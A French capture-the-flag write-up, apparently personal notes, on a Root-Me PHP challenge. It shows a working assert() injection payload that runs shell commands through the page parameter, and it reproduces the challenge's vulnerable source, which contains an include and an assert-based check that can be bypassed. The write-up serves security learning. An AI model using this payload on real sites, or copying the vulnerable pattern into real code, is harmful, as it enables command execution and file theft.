<script src="../../../js/password-protect.js"></script>

---
categorie: web-server
tags:
  - rootme
  - "#informatique/cyber"
lien:
---
# But

reussir Ã  afficher le .passwd 

# Fourni

un simple site php avec un /?page=

on sait que le site utilise assert



# MÃ©thode de rÃ©solution

je vois que c'est l'utilisation de assert qui semble poser problÃ¨me.

![[Pasted image 20241203120927.png]]*

si j'essai d'ajouter un ' :
![[Pasted image 20241203120944.png]]

Je peux dÃ©duire qu'il doit y avoir quelque chose tel que ceci : 


```
var = '<mon input>' + '.php'
```

je vois aussi que strpos est utilisÃ©, qui permet de savoir a quelle position d'une liste, un string se trouve ( je crois )

![[Pasted image 20241203121148.png]]

je suppose donc qu'il doit y avoir quelque chose comme 


```
list = ["contact", "home", "about"]
```
et qu'il faut que mon input soit dans la liste.

en cherchant pourquoi assert Ã©tait vulnÃ©rable, je trouve un [article linkedin](https://www.linkedin.com/pulse/php-assert-vulnerable-local-file-inclusion-mohamed-fakroud), et je trouve un payload que je test et Ã§a passe, il faut maintenant que je comprenne pourquoi cela fonctionne

# recherche apres avoir trouvÃ© 

Ce qui a fonctionnÃ© : 


maintenant que je peux envoyer des commandes dans la machine, je peux faire en sorte de rÃ©cupÃ©rer le fichier index.php

```
http://challenge01.root-me.org/web-serveur/ch47/?page="' and die(system('cat index.php | base64')) or '"
```



```
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = "includes/" . $page . ".php";

  // too much problems with script kiddies. Detect attack attempt.
  assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
  $val = "includes/". $page;
  
  if(!file_exists($file)){
      echo "'$file'";
    die ("File does not exist");
  }
} else {
  $file = "includes/home.php";
}

?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Evilness is words to live by.</title>
  </head>
  <body>
    <div>
      <a href="?page=home">Home</a> |
      <a href="?page=about">About</a> |
      <a href="?page=contact">Contact</a>
    </div>
    <hr style="margin-bottom:30px;">
    <div>
      <?php
        include_once( $file );
      ?>
    </div>

  </body>
</html>
```


on comprend donc pourquoi cela fonctionne : 

la ligne strpos permet d'Ã©viter a priori d'aller chercher la page ../<quelque chose> en mettant un "hacking detected"
![[Pasted image 20241203122802.png]]

```assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");```

lorsqu'on met "../ " dans l'url , alors le strpos evalue a true donc le assert evalue a false, et le die se dÃ©clenche


# Conclusion 

Il ne faut pas utiliser assert dans ce genre de cas, et il faut ajouter de la sanitization sur les input user